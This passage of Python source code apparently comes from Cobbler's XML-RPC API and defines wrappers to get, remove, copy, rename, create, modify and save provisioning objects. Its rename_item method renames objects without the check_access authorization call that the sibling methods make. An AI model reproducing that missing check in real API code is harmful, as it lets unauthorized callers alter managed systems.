item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"mgmtclass\", name, token)\n\n    def get_package_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a package which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"package\", name, token)\n\n    def get_file_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a file which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"file\", name, token)\n\n    def get_menu_handle(self, name: str, token: str):\n        \"\"\"\n        Get a handle for a menu which allows you to use the functions ``modify_*`` or ``save_*`` to manipulate it.\n\n        :param name: The name of the item.\n        :param token: The API-token obtained via the login() method.\n        :return: The handle of the desired object.\n        \"\"\"\n        return self.get_item_handle(\"menu\", name, token)\n\n    def remove_item(self, what: str, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes an item from a collection.\n        Note that this requires the name of the distro, not an item handle.\n\n        :param what: The item type of the item to remove.\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        self._log(\"remove_item (%s, recursive=%s)\" % (what, recursive), name=name, token=token)\n        obj = self.api.get_item(what, name)\n        self.check_access(token, \"remove_%s\" % what, obj)\n        self.api.remove_item(what, name, delete=True, with_triggers=True, recursive=recursive)\n        return True\n\n    def remove_distro(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a distribution from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"distro\", name, token, recursive)\n\n    def remove_profile(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a profile from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"profile\", name, token, recursive)\n\n    def remove_system(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a system from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"system\", name, token, recursive)\n\n    def remove_repo(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a repository from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"repo\", name, token, recursive)\n\n    def remove_image(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes an image from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"image\", name, token, recursive)\n\n    def remove_mgmtclass(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a managementclass from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"mgmtclass\", name, token, recursive)\n\n    def remove_package(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a package from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"package\", name, token, recursive)\n\n    def remove_file(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a file from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"file\", name, token, recursive)\n\n    def remove_menu(self, name: str, token: str, recursive: bool = True):\n        \"\"\"\n        Deletes a menu from Cobbler.\n\n        :param name: The name of the item to remove.\n        :param token: The API-token obtained via the login() method.\n        :param recursive: If items which are depending on this one should be erased too.\n        :return: True if the action was successful.\n        \"\"\"\n        return self.remove_item(\"menu\", name, token, recursive)\n\n    def copy_item(self, what: str, object_id: str, newname: str, token: str):\n        \"\"\"\n        Creates a new object that matches an existing object, as specified by an id.\n\n        :param what: The item type which should be copied.\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        self._log(\"copy_item(%s)\" % what, object_id=object_id, token=token)\n        self.check_access(token, \"copy_%s\" % what)\n        obj = self.__get_object(object_id)\n        self.api.copy_item(what, obj, newname)\n        return True\n\n    def copy_distro(self, object_id: str, newname: str, token=None):\n        \"\"\"\n        Copies a distribution and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"distro\", object_id, newname, token)\n\n    def copy_profile(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a profile and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"profile\", object_id, newname, token)\n\n    def copy_system(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a system and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"system\", object_id, newname, token)\n\n    def copy_repo(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a repository and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"repo\", object_id, newname, token)\n\n    def copy_image(self, object_id, newname, token=None):\n        \"\"\"\n        Copies an image and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"image\", object_id, newname, token)\n\n    def copy_mgmtclass(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a management class and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"mgmtclass\", object_id, newname, token)\n\n    def copy_package(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a package and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"package\", object_id, newname, token)\n\n    def copy_file(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a file and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"file\", object_id, newname, token)\n\n    def copy_menu(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a menu and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"menu\", object_id, newname, token)\n\n    def rename_item(self, what, object_id, newname, token=None):\n        \"\"\"\n        Renames an object specified by object_id to a new name.\n\n        :param what: The type of object which shall be renamed to a new name.\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        self._log(\"rename_item(%s)\" % what, object_id=object_id, token=token)\n        obj = self.__get_object(object_id)\n        self.api.rename_item(what, obj, newname)\n        return True\n\n    def rename_distro(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a distribution specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"distro\", object_id, newname, token)\n\n    def rename_profile(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a profile specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"profile\", object_id, newname, token)\n\n    def rename_system(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a system specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"system\", object_id, newname, token)\n\n    def rename_repo(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a repository specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"repo\", object_id, newname, token)\n\n    def rename_image(self, object_id, newname, token=None):\n        \"\"\"\n        Renames an image specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"image\", object_id, newname, token)\n\n    def rename_mgmtclass(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a managementclass specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"mgmtclass\", object_id, newname, token)\n\n    def rename_package(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a package specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"package\", object_id, newname, token)\n\n    def rename_file(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a file specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"file\", object_id, newname, token)\n\n    def rename_menu(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a menu specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"menu\", object_id, newname, token)\n\n    def new_item(self, what, token, is_subobject: bool = False):\n        \"\"\"Creates a new (unconfigured) object, returning an object handle that can be used.\n\n        Creates a new (unconfigured) object, returning an object handle that can be used with ``modify_*`` methods and\n        then finally ``save_*`` methods. The handle only exists in memory until saved.\n\n        :param what: specifies the type of object: ``distro``, ``profile``, ``system``, ``repo``, ``image``\n                                                   ``mgmtclass``, ``package``, ``file`` or ``menu``\n        :param token: The API-token obtained via the login() method.\n        :param is_subobject: If the object is a subobject of an already existing object or not.\n        :return: The object id for the newly created object.\n        \"\"\"\n        self._log(\"new_item(%s)\" % what, token=token)\n        self.check_access(token, \"new_%s\" % what)\n        if what == \"distro\":\n            d = distro.Distro(self.api, is_subobject=is_subobject)\n        elif what == \"profile\":\n            d = profile.Profile(self.api, is_subobject=is_subobject)\n        elif what == \"system\":\n            d = system.System(self.api, is_subobject=is_subobject)\n        elif what == \"repo\":\n            d = repo.Repo(self.api, is_subobject=is_subobject)\n        elif what == \"image\":\n            d = image.Image(self.api, is_subobject=is_subobject)\n        elif what == \"mgmtclass\":\n            d = mgmtclass.Mgmtclass(self.api, is_subobject=is_subobject)\n        elif what == \"package\":\n            d = package.Package(self.api, is_subobject=is_subobject)\n        elif what == \"file\":\n            d = file.File(self.api, is_subobject=is_subobject)\n        elif what == \"menu\":\n            d = menu.Menu(self.api, is_subobject=is_subobject)\n        else:\n            raise CX(\"internal error, collection name is \\\"%s\\\"\" % what)\n        key = \"___NEW___%s::%s\" % (what, self.__get_random(25))\n        self.object_cache[key] = (time.time(), d)\n        return key\n\n    def new_distro(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"distro\", token)\n\n    def new_profile(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"profile\", token)\n\n    def new_subprofile(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"profile\", token, is_subobject=True)\n\n    def new_system(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"system\", token)\n\n    def new_repo(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"repo\", token)\n\n    def new_image(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"image\", token)\n\n    def new_mgmtclass(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"mgmtclass\", token)\n\n    def new_package(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"package\", token)\n\n    def new_file(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"file\", token)\n\n    def new_menu(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"menu\", token)\n\n    def modify_item(self, what, object_id, attribute, arg, token: str) -> bool:\n        \"\"\"\n        Adjusts the value of a given field, specified by 'what' on a given object id. Allows modification of certain\n        attributes on newly created or existing distro object handle.\n\n        :param what: The type of object to modify.1\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        self._log(\"modify_item(%s)\" % what, object_id=object_id, attribute=attribute, token=token)\n        obj = self.__get_object(object_id)\n        self.check_access(token, \"modify_%s\" % what, obj, attribute)\n\n        if hasattr(obj, attribute):\n            setattr(obj, attribute, arg)\n            return True\n        return False\n\n    def modify_distro(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a distribution.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"distro\", object_id, attribute, arg, token)\n\n    def modify_profile(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a profile.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"profile\", object_id, attribute, arg, token)\n\n    def modify_system(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a system.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"system\", object_id, attribute, arg, token)\n\n    def modify_image(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of an image.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"image\", object_id, attribute, arg, token)\n\n    def modify_repo(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a repository.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"repo\", object_id, attribute, arg, token)\n\n    def modify_mgmtclass(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a managementclass.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"mgmtclass\", object_id, attribute, arg, token)\n\n    def modify_package(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a package.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"package\", object_id, attribute, arg, token)\n\n    def modify_file(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a file.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"file\", object_id, attribute, arg, token)\n\n    def modify_menu(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a menu.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"menu\", object_id, attribute, arg, token)\n\n    def modify_setting(self, setting_name: str, value, token: str) -> int:\n        \"\"\"\n        Modify a single attribute of a setting.\n\n        :param setting_name: The name of the setting which shall be adjusted.\n        :param value: The new value for the setting.\n        :param token: The API-token obtained via the login() method.\n        :return: 0 on success, 1 on error.\n        \"\"\"\n        if not self.api.settings().allow_dynamic_settings:\n            self._log(\"modify_setting - feature turned off but was tried to be accessed\", token=token)\n            return 1\n        self._log(\"modify_setting(%s)\" % setting_name, token=token)\n        if not hasattr(self.api.settings(), setting_name):\n            self.logger.warning(\"Setting did not exist!\")\n            return 1\n        self.check_access(token, \"modify_setting\")\n        self._log(\"modify_setting(%s)\" % setting_name, token=token)\n        try:\n            if isinstance(getattr(self.api.settings(), setting_name), str):\n                value = str(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), int):\n                value = int(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), bool):\n                value = utils.input_boolean(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), float):\n                value = float(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), list):\n                value = utils.input_string_or_list(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), dict):\n                value = utils.input_string_or_dict(value)[1]\n            else:\n                self.logger.error(\"modify_setting(%s) - Wrong type for value\", setting_name)\n                return 1\n        except TypeError:\n            return 1\n        except ValueError:\n            return 1\n\n        setattr(self.api.settings(), setting_name, value)\n        self.api.settings().save()\n        return 0\n\n    def auto_add_repos(self, token: str):\n        \"\"\"\n        :param token: The API-token obtained via the login() method.\n        \"\"\"\n        self.check_access(token, \"new_repo\", token)\n        self.api.auto_add_repos()\n        return True\n\n    def __is_interface_field(self, field_name: str) -> bool:\n        \"\"\"\n        Checks if the field in ``f`` is related to a network interface.\n\n        :param field_name: The fieldname to check.\n        :return: True if the fields is related to a network interface, otherwise False.\n        \"\"\"\n        # FIXME: This is not tested and I believe prone to errors. Needs explicit testing.\n        if field_name in (\"delete_interface\", \"rename_interface\"):\n            return True\n\n        interface = system.NetworkInterface(self.api)\n        fields = []\n        for attribute in interface.__dict__.keys():\n            if attribute.startswith(\"_\") and (\"api\" not in attribute or \"logger\" in attribute):\n                fields.append(attribute[1:])\n\n        return field_name in fields\n\n    def xapi_object_edit(self, object_type: str, object_name: str, edit_type: str, attributes: dict, token: str):\n        \"\"\"Extended API: New style object manipulations, 2.0 and later.\n\n        Extended API: New style object manipulations, 2.0 and later preferred over using ``new_*``, ``modify_*```,\n        ``save_*`` directly. Though we must preserve the old ways for backwards compatibility these cause much less\n        XMLRPC traffic.\n\n        Ex: xapi_object_edit(\"distro\",\"el5\",\"add\",{\"kernel\":\"/tmp/foo\",\"initrd\":\"/tmp/foo\"},token)\n\n        :param object_type: The object type which corresponds to the collection type the object is in.\n        :param object_name: The name of the object under question.\n        :param edit_type: One of 'add', 'rename', 'copy', 'remove'\n        :param attributes: The attributes which shall be edited. This should be JSON-style string.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        self.check_access(token, \"xedit_%s\" % object_type, token)\n\n        if object_name.strip() == \"\":\n            raise ValueError(\"xapi_object_edit() called without an object name\")\n\n        handle = \"\"\n        if edit_type in (\"add\", \"rename\"):\n            if edit_type == \"rename\":\n                tmp_name = attributes[\"newname\"]\n            else:\n                tmp_name = object_name\n            try:\n                handle = self.get_item_handle(object_type, tmp_name)\n            except CX:\n                pass\n            if handle:\n                raise CX(\"It seems unwise to overwrite the object %s, try 'edit'\", tmp_name)\n\n        if edit_type == \"add\":\n            is_subobject = object_type == \"profile\" and \"parent\" in attributes\n            if is_subobject and \"distro\" in attributes:\n                raise ValueError(\"You can't change both 'parent' and 'distro'\")\n            if object_type == \"system\":\n                if \"profile\" not in attributes and \"image\" not in attributes:\n                    raise ValueError(\"You must specify a 'profile' or 'image' for new systems\")\n            handle = self.new_item(object_type, token, is_subobject=is_subobject)\n        else:\n            handle = self.get_item_handle(object_type, object_name)\n\n        if edit_type == \"rename\":\n            self.rename_item(object_type, handle, attributes[\"newname\"], token)\n            handle = self.get_item_handle(object_type, attributes[\"newname\"], token)\n\n        if edit_type == \"copy\":\n            is_subobject = object_type == \"profile\" and \"parent\" in attributes\n            if is_subobject:\n                if \"distro\" in attributes:\n                    raise ValueError(\"You can't change both 'parent' and 'distro'\")\n                self.copy_item(object_type, handle, attributes[\"newname\"], token)\n                handle = self.get_item_handle(\"profile\", attributes[\"newname\"], token)\n                self.modify_item(\"profile\", handle, \"parent\", attributes[\"parent\"], token)\n            else:\n                self.copy_item(object_type, handle, attributes[\"newname\"], token)\n                handle = self.get_item_handle(object_type, attributes[\"newname\"], token)\n\n        if edit_type in [\"copy\", \"rename\"]:\n            del attributes[\"name\"]\n            del attributes[\"newname\"]\n\n        if edit_type != \"remove\":\n            # FIXME: this doesn't know about interfaces yet!\n            # if object type is system and fields add to dict and then modify when done, rather than now.\n            imods = {}\n            # FIXME: needs to know about how to delete interfaces too!\n            priority_attributes = [\"name\", \"parent\", \"distro\", \"profile\", \"image\"]\n            for attr_name in priority_attributes:\n                if attr_name in attributes:\n                    self.modify_item(object_type, handle, attr_name, attributes.pop(attr_name), token)\n            for (key, value) in list(attributes.items()):\n                if object_type != \"system\" or not self.__is_interface_field(key):\n                    # in place modifications allow for adding a key/value pair while keeping other k/v pairs intact.\n                    if key in [\"autoinstall_meta\", \"kernel_options\", \"kernel_options_post\", \"template_files\",\n                               \"boot_files\", \"fetchable_files\", \"params\"] \\\n                            and attributes.get(\"in_place\"):\n                        details = self.get_item(object_type, object_name)\n                        v2 = details[key]\n                        (ok, parsed_input) = utils.input_string_or_dict(value)\n                        for (a, b) in list(parsed_input.items()):\n                            if a.startswith(\"~\") and len(a) > 1:\n                                del v2[a[1:]]\n                            else:\n                                v2[a] = b\n                        value = v2\n\n                    self.modify_item(object_type, handle, key, value, token)\n\n                else:\n                    modkey = \"%s-%s\" % (key, attributes.get(\"interface\", \"\"))\n                    imods[modkey] = value\n\n            if object_type == \"system\":\n                # FIXME: Don't call this tree if we are not doing any interface stuff.\n                self.__interface_edits(handle, attributes, object_name)\n        else:\n            # remove item\n            recursive = attributes.get(\"recursive\", False)\n            if object_type in [\"profile\", \"menu\"] and recursive is False:\n                childs = len(self.api.find_items(object_type, criteria={'parent': attributes['name']}))\n                if childs > 0:\n                    raise CX(\"Can't delete this %s there are %s sub%ss and 'recursive' is set to 'False'\" %\n                             (object_type, childs, object_type))\n\n            self.remove_item(object_type, object_name, token, recursive=recursive)\n            return True\n\n        # FIXME: use the bypass flag or not?\n        self.save_item(object_type, handle, token)\n        return True\n\n    def __interface_edits(self, handle, attributes, object_name):\n        if \"delete_interface\" not in attributes and \"rename_interface\" not in attributes:\n            # This if is taking care of interface logic. The interfaces are a dict, thus when we get the obj via\n            # the api we get references to the original interfaces dict. Thus this trick saves us the pain of\n            # writing the modified obj back to the collection. Always remember that dicts are mutable.\n            system_to_edit = self.__get_object(handle)\n            if system_to_edit is None:\n                raise ValueError(\"No system found with the specified name (name given: \\\"%s\\\")!\" % object_name)\n            # If we don't have an explicit interface name use the default interface\n            interface_name = attributes.get(\"interface\", \"default\")\n            self.logger.debug(\"Interface \\\"%s\\\" is being edited.\", interface_name)\n            interface = system_to_edit.interfaces.get(interface_name)\n            if interface is None:\n                # If the interface is not existing, create a new one.\n                interface = system.NetworkInterface(self.api)\n            for attribute_key in attributes:\n                if self.__is_interface_field(attribute_key):\n                    if hasattr(interface, attribute_key):\n                        setattr(interface, attribute_key, attributes[attribute_key])\n                    else:\n                        self.logger.warning(\"Network interface field \\\"%s\\\" could not be set. Skipping it.\",\n                                            attribute_key)\n                else:\n                    self.logger.debug(\"Field %s was not an interface field.\", attribute_key)\n            system_to_edit.interfaces.update({interface_name: interface})\n        elif \"delete_interface\" in attributes:\n            if attributes.get(\"interface\") is None:\n                raise ValueError(\"Interface is required for deletion.\")\n            system_to_edit = self.__get_object(handle)\n            system_to_edit.delete_interface(attributes.get(\"interface\"))\n        elif \"rename_interface\" in attributes:\n            system_to_edit = self.__get_object(handle)\n            system_to_edit.rename_interface(attributes.get(\"interface\", \"\"),\n                                            attributes.get(\"rename_interface\", \"\"))\n\n    def save_item(self, what, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param what: The type of object which shall be saved. This corresponds to the collections.\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        self._log(\"save_item(%s)\" % what, object_id=object_id, token=token)\n        obj = self.__get_object(object_id)\n        self.check_access(token, \"save_%s\" % what, obj)\n        if editmode == \"new\":\n            self.api.add_item(what, obj, check_for_duplicate_names=True)\n        else:\n            self.api.add_item(what, obj)\n        return True\n\n    def save_distro(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"distro\", object_id, token, editmode=editmode)\n\n    def save_profile(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"profile\", object_id, token, editmode=editmode)\n\n    def save_system(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"system\", object_id, token, editmode=editmode)\n\n    def save_image(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"image\", object_id, token, editmode=editmode)\n\n    def save_repo(self, object_id, 